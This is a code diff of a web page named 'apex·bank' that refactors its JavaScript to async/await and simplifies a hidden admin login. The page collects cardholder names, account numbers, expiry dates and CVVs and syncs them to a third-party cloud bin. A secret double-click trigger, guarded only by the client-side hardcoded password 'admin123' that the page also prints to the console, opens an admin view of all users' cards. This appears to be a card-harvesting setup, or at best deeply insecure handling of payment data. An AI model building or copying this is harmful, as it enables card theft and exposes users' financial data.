     if (!confirm('⚠️ Delete ALL cards from cloud? This cannot be undone.')) return;
     allCards = [];
     renderCards();
     previewArea.classList.remove('visible');
-    saveToJsonBin(function() {
-      alert('All cards deleted.');
-    });
+    await saveToJsonBin();
+    alert('All cards deleted.');
   });
 
-  // ─── CUSTOM ADMIN LOGIN LOGIC ─────────────────────────────
-  var pendingAdminCallback = null;
-
-  function showLoginModal(callback) {
-    pendingAdminCallback = callback;
-    loginPassword.value = '';
-    loginError.classList.remove('show');
-    loginOverlay.classList.add('active');
-    setTimeout(function() { loginPassword.focus(); }, 100);
-  }
-
-  function hideLoginModal() {
-    loginOverlay.classList.remove('active');
-    pendingAdminCallback = null;
-  }
-
-  function handleLoginAttempt() {
-    var password = loginPassword.value.trim();
-    if (password === 'admin123') {
-      hideLoginModal();
-      if (pendingAdminCallback) {
-        pendingAdminCallback();
-        pendingAdminCallback = null;
-      }
-    } else {
-      loginError.classList.add('show');
-      loginPassword.value = '';
-      loginPassword.focus();
-    }
-  }
-
-  loginConfirm.addEventListener('click', handleLoginAttempt);
-  loginCancel.addEventListener('click', hideLoginModal);
-
-  loginPassword.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') handleLoginAttempt();
-  });
-
-  loginOverlay.addEventListener('click', function(e) {
-    if (e.target === loginOverlay) hideLoginModal();
-  });
-
-  // ─── SECRET ADMIN TRIGGER ────────────────────────────────
+  // ─── secret admin trigger ────────────────────────────────
   adminTriggerHeader.addEventListener('dblclick', function() {
-    showLoginModal(function() {
+    const password = prompt('Enter admin password:');
+    if (password === 'admin123') {
       openAdminModal();
-    });
+    } else if (password !== null) {
+      alert('Incorrect password.');
+    }
   });
 
   // ─── event listeners ──────────────────────────────────────
   function handleAdd() {
-    var holder = holderInput.value;
-    var acc = accInput.value;
-    var exp = expInput.value;
-    var cvv = cvvInput.value;
+    const holder = holderInput.value;
+    const acc = accInput.value;
+    const exp = expInput.value;
+    const cvv = cvvInput.value;
     addCard(holder, acc, exp, cvv);
   }
 
   addBtn.addEventListener('click', handleAdd);
-  syncBtn.addEventListener('click', function() {
-    saveToJsonBin(function() {
-      alert('Synced to cloud!');
-    });
+  syncBtn.addEventListener('click', async () => {
+    await saveToJsonBin();
+    alert('Synced to cloud!');
   });
 
-  var inputs = [holderInput, accInput, expInput, cvvInput];
-  for (var idx = 0; idx < inputs.length; idx++) {
-    inputs[idx].addEventListener('keypress', function(e) {
+  [holderInput, accInput, expInput, cvvInput].forEach(inp => {
+    inp.addEventListener('keypress', (e) => {
       if (e.key === 'Enter') { e.preventDefault(); handleAdd(); }
     });
-  }
-
-  // ─── init (START EMPTY – no sample data) ──────────────────
-  loadFromJsonBin(function() {
-    // No sample card added – start completely empty
-    console.log('🟦 apex·bank started with empty data');
   });
 
-  console.log('🟦 apex·bank WebView compatible (empty start)');
+  // ─── init ──────────────────────────────────────────────────
+  (async function init() {
+    await loadFromJsonBin();
+    // No sample card added – start completely empty
+    // User will add cards manually
+  })();
+
+  console.log('🟦 apex·bank with JSONBin (privacy fix, empty start)');
   console.log('📱 Device ID:', deviceId);
   console.log('🔑 Admin: double-click header → password: admin123');
+  console.log('✅ User sees only their own cards. Admin sees all cards.');
 </script>
 </body>
 </html>
